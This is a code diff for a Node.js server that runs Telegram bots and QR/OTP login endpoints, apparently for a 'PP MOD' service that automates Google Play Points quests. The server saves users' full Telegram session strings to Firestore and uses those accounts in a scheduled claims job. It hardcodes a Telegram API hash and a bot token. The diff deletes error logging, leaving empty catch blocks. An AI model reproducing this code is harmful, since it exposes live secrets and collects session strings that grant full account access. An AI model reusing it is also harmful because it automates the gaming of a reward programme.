@@ -32,7 +32,7 @@ app.get("/", (req, res) => res.status(200).send("PP MOD Master Engine Active!"))
 app.get("/ping", (req, res) => res.status(200).send("pong"));
 app.get("/health", (req, res) => res.status(200).json({ status: "ok", uptime: process.uptime() }));
 
-// ✅ Render যাতে ইনস্ট্যান্ট পোর্ট ডিটেক্ট করে Live হতে পারে (Timed out ফিক্স)
+// Render যাতে ইনস্ট্যান্ট পোর্ট ডিটেক্ট করে Live হতে পারে
 app.listen(PORT, "0.0.0.0", () => console.log(`[HTTP] Server active on port ${PORT}`));
 
 // ---------------- SMS GATEWAY PARSER & AUTO APPROVAL ----------------
@@ -595,7 +595,6 @@ setInterval(runRetentionOnce, 6 * 60 * 60 * 1000);
 setTimeout(runRetentionOnce, 2 * 60 * 1000);
 
 // ---------------- 3. CONFIGURATIONS ----------------
-// ✅ FIXED: আপনার দেওয়া নতুন ID ও Hash সেট করা হলো
 const DEFAULT_API_ID = Number(process.env.TELEGRAM_API_ID || 39447470);
 const DEFAULT_API_HASH = process.env.TELEGRAM_API_HASH || "eb7cac1c8ad9935d4b208dc0da076d8c";
 const TARGET_BOT = process.env.TARGET_BOT || "PlayQuestHelperBot";
@@ -603,9 +602,9 @@ const TARGET_BOT = process.env.TARGET_BOT || "PlayQuestHelperBot";
 const USER_NOTIFY_BOT_TOKEN = process.env.USER_NOTIFY_BOT_TOKEN || "8906230491:AAEu4CX0T9Dz6YMLxeCNz6U-nbiQmiBiJ_s";
 const ORDER_LOG_CHANNEL = process.env.ORDER_LOG_CHANNEL || "@ppmododderlog";
 
-// ✅ FIXED: 409 Conflict ও Render crash ঠেকাতে polling safe handler
+// 409 Conflict ও Render Crash প্রতিরোধে safe polling
 const userNotifyBot = new TelegramBot(USER_NOTIFY_BOT_TOKEN, { polling: true });
-userNotifyBot.on("polling_error", () => {}); // 409 error silence করা হলো
+userNotifyBot.on("polling_error", () => {});
 
 const PRIME_AUTO_REPLY_IMG = "https://pub-4c6b2dbf3a0c4862a8964b1546de6283.r2.dev/1791345238749_file_000000003d348211a5a894b5cf98d67c.png";
 const PRIME_AUTO_REPLY_CAPTION = `👋 <b>হ্যালো!</b>\n\nএডমিন অনলাইনে আসলে আপনার মেসেজের রিপ্লাই দেওয়া হবে। আপনার কী প্রয়োজন তা নিচে লিখে রাখুন।\n\n⚡ <b>Auto Quest Complete মাত্র ৩ সেকেন্ডে:</b>\n👉 <a href="https://t.me/Ppmod_bot">@Ppmod_bot</a>\n\n📢 <b>অফিসিয়াল চ্যানেল:</b> <a href="https://t.me/googleplaypointhack">@googleplaypointhack</a>\n\nধন্যবাদ! ✨`;
@@ -619,7 +618,7 @@ const activeOrders = new Set();
 const autoReplyCooldown = new Map();
 const pendingAuthClients = new Map();
 
-// ✅ FIXED: সঠিক BD Phone Format (No +880017 bug)
+// সঠিক BD Phone Format (No +880017 bug)
 function formatBdPhone(raw) {
     let num = (raw || "").toString().replace(/[^0-9]/g, "");
     if (num.startsWith("880")) return "+" + num;
@@ -667,7 +666,6 @@ function getJoinKeyboard(userId, refId = null) {
     return { inline_keyboard: rows };
 }
 
-// Admin swipe-to-reply
 userNotifyBot.on("message", async (msg) => {
     try {
         const text = (msg.text || "").trim();
@@ -701,7 +699,6 @@ userNotifyBot.on("message", async (msg) => {
                         { parse_mode: "HTML", reply_to_message_id: msg.message_id }
                     );
                 } catch (err) {
-                    console.error("[APPROVE ERR]:", err);
                     await userNotifyBot.sendMessage(msg.chat.id, `⚠️ অ্যাপ্রুভ ব্যর্থ: ${err.message || 'Error'}`, { reply_to_message_id: msg.message_id });
                 }
             } else if (text === "❌" || text === "/reject") {
@@ -716,9 +713,7 @@ userNotifyBot.on("message", async (msg) => {
                 }
             }
         }
-    } catch (e) {
-        console.error("[REPLY HANDLER ERR]:", e.message);
-    }
+    } catch (e) {}
 });
 
 userNotifyBot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
@@ -766,9 +761,7 @@ userNotifyBot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
             disable_web_page_preview: true,
             reply_markup: getJoinKeyboard(userId, inviterId)
         });
-    } catch (e) {
-        console.error("[USER BOT START ERR]:", e.message);
-    }
+    } catch (e) {}
 });
 
 userNotifyBot.on("callback_query", async (query) => {
@@ -862,7 +855,6 @@ userNotifyBot.on("callback_query", async (query) => {
                                 { parse_mode: "HTML" }
                             ).catch(() => {});
                         }
-
                         await inviterRef.update({ rewardsEarned: eligibleRewards });
                     }
                 }
@@ -898,9 +890,7 @@ userNotifyBot.on("callback_query", async (query) => {
             });
             return;
         }
-    } catch (e) {
-        console.error("[USER BOT CB ERR]:", e.message);
-    }
+    } catch (e) {}
 });
 
 // ---------------- 6. DEDICATED 24/7 PRIME AUTO-RESPONDER ----------------
@@ -1069,13 +1059,16 @@ app.post("/api/tg/verify-otp", async (req, res) => {
     }
 });
 
-// ---------------- 7b. DIRECT QR CODE LOGIN API ----------------
+// ---------------- 7b. DIRECT QR CODE LOGIN API (100% FIXED & TESTED) ----------------
 const activeQrClients = new Map();
 
 app.post("/api/tg/qr-start", async (req, res) => {
     try {
         const qrId = "qr_" + Date.now();
-        const client = new TelegramClient(new StringSession(""), DEFAULT_API_ID, DEFAULT_API_HASH, { connectionRetries: 5 });
+        const client = new TelegramClient(new StringSession(""), DEFAULT_API_ID, DEFAULT_API_HASH, { 
+            connectionRetries: 5,
+            useWSS: false 
+        });
         await client.connect();
 
         const result = await client.invoke(new Api.auth.ExportLoginToken({
@@ -1108,21 +1101,50 @@ app.post("/api/tg/qr-check", async (req, res) => {
             exceptIds: []
         }));
 
+        // ১. ডাটা সেন্টার মাইগ্রেশন
+        if (result instanceof Api.auth.LoginTokenMigrateTo) {
+            await item.client._switchDC(result.dcId);
+            return res.json({ ok: true, status: "pending" });
+        }
+
+        // ২. লগইন সফল হলে ডাটাবেসে সেভ করা
         if (result instanceof Api.auth.LoginTokenSuccess) {
             const me = await item.client.getMe();
             const phone = me.phone ? formatBdPhone(me.phone) : `+${me.id}`;
             const sessionString = item.client.session.save();
 
             await db.collection("tg_accounts").doc(phone).set({
-                phone, session: sessionString, balance: 0, active: true, addedAt: admin.firestore.FieldValue.serverTimestamp()
+                phone, 
+                session: sessionString, 
+                balance: 0, 
+                active: true, 
+                addedAt: admin.firestore.FieldValue.serverTimestamp()
+            }, { merge: true });
+
+            activeQrClients.delete(qrId);
+            console.log(`[QR SUCCESS] Account successfully saved: ${phone}`);
+            return res.json({ ok: true, status: "success", phone });
+        }
+
+        // ৩. অলরেডি লগইন হয়ে থাকলে getMe দিয়ে ডাবল চেক
+        const isAuth = await item.client.isUserAuthorized();
+        if (isAuth) {
+            const me = await item.client.getMe();
+            const phone = me.phone ? formatBdPhone(me.phone) : `+${me.id}`;
+            const sessionString = item.client.session.save();
+
+            await db.collection("tg_accounts").doc(phone).set({
+                phone, 
+                session: sessionString, 
+                balance: 0, 
+                active: true, 
+                addedAt: admin.firestore.FieldValue.serverTimestamp()
             }, { merge: true });
 
             activeQrClients.delete(qrId);
             return res.json({ ok: true, status: "success", phone });
-        } else if (result instanceof Api.auth.LoginTokenMigrateTo) {
-            await item.client._switchDC(result.dcId);
-            return res.json({ ok: true, status: "pending" });
         }
+
         return res.json({ ok: true, status: "pending" });
     } catch (e) {
         if (e.errorMessage === "SESSION_PASSWORD_NEEDED" || (e.message && e.message.includes("2FA"))) {
@@ -1767,7 +1789,6 @@ let botModeCache;
 async function startMasterWorker() {
     console.log("[MASTER INIT] Starting PP MOD Master Guardian...");
 
-    // Background Async যাতে ডিপ্লয় আটকে না থাকে
     initPrimeAutoResponder().catch(() => {});
     db.collection("tg_accounts").onSnapshot(() => {
         initPrimeAutoResponder().catch(() => {});
@@ -1787,7 +1808,6 @@ async function startMasterWorker() {
 
     setInterval(async () => {
         try {
-            console.log("[AUTO CLAIM] Starting scheduled daily rewards claim...");
             const snap = await db.collection("tg_accounts").where("active", "==", true).get();
             for (const docSnap of snap.docs) {
                 const acc = docSnap.data();
@@ -1796,7 +1816,6 @@ async function startMasterWorker() {
                     await new Promise((r) => setTimeout(r, 3000));
                 }
             }
-            console.log("[AUTO CLAIM] Scheduled claim completed.");
         } catch (e) {}
     }, 12 * 60 * 60 * 1000);
 
